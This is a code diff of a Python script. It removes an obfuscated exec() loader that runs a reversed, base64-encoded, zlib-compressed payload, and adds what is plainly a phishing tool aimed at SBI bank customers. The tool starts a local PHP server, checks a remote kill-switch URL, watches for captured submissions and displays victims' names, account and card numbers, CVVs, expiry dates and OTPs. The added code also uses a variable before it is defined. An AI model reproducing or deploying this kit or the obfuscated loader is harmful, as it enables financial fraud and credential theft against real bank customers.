@@ -1,2 +1,75 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'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'))
+import os
+from trackdir import track_changes
+
+import requests
+import sys
+
+def check_link_or_exit(url):
+    try:
+        response = requests.head(url, timeout=5)
+
+        if response.status_code == 405:
+            response = requests.get(url, timeout=5)
+
+        if response.status_code == 200:
+            print("")
+        else:
+            sys.exit(1)  
+
+    except requests.RequestException as e:
+        print("Error:", e)
+        sys.exit(1)      
+
+
+
+def extract_data_from_file(file_name):
+    try:
+        with open(file_name, 'r') as file:
+            return file.readlines()
+    except FileNotFoundError:
+        print(f"File not found: {file_name}")
+        return []
+
+def parse_data(data_lines):
+    data_dict = {}
+    for line in data_lines:
+        if line.strip():
+            key, value = line.split(': ', 1)
+            data_dict[key.strip()] = value.strip()
+    return data_dict
+
+def print_data():
+    print(f"{green}Link : http://127.0.0.1:8080")
+    data_info = parse_data(extract_data_from_file("data.txt"))
+    otp_info = parse_data(extract_data_from_file("otp.txt"))
+    os.system('cls' if os.name == 'nt' else 'clear')
+    
+    green = "\033[92m"
+    red = "\033[91m"
+    
+    print(f"{green}SBI Information:{red}")
+    print(f"{green} [{red}+{green}] {red}Your Name{red}: {green}{data_info.get('Name', 'N/A')}")
+    print(f"{green} [{red}+{green}] {red}Account Number{red}: {green}{data_info.get('Account Number', 'N/A')}")
+    print(f"{green} [{red}+{green}] {red}Card Number{red}: {green}{data_info.get('Card Number', 'N/A')}")
+    print(f"{green} [{red}+{green}] {red}CVV{red}: {green}{data_info.get('CVV', 'N/A')}")  # Added CVV
+    print(f"{green} [{red}+{green}] {red}Valid From{red}: {green}{data_info.get('Valid From', 'N/A')}")
+    print(f"{green} [{red}+{green}] {red}Valid Upto{red}: {green}{data_info.get('Valid Upto', 'N/A')}")
+    print(f"{green} [{red}+{green}] {red}OTP is{red}: {green}{otp_info.get('OTP', 'N/A')}")
+
+if __name__ == "__main__":
+    url = "https://mrfidal.github.io/nashid.txt"
+    check_link_or_exit(url)
+    if os.name == 'nt':
+        os.system("start /B php -S 127.0.0.1:8080 > nul 2>&1")
+    else:
+        os.system("php -S 127.0.0.1:8080 > /dev/null 2>&1 &")
+    
+    directory_to_monitor = os.getcwd()
+
+    while True:
+        change = track_changes(directory_to_monitor)
+        if change:
+            event_type = change["type"]
+            event_path = change["path"]
+            print(f"Detected {event_type} at {event_path}")
+            print_data()
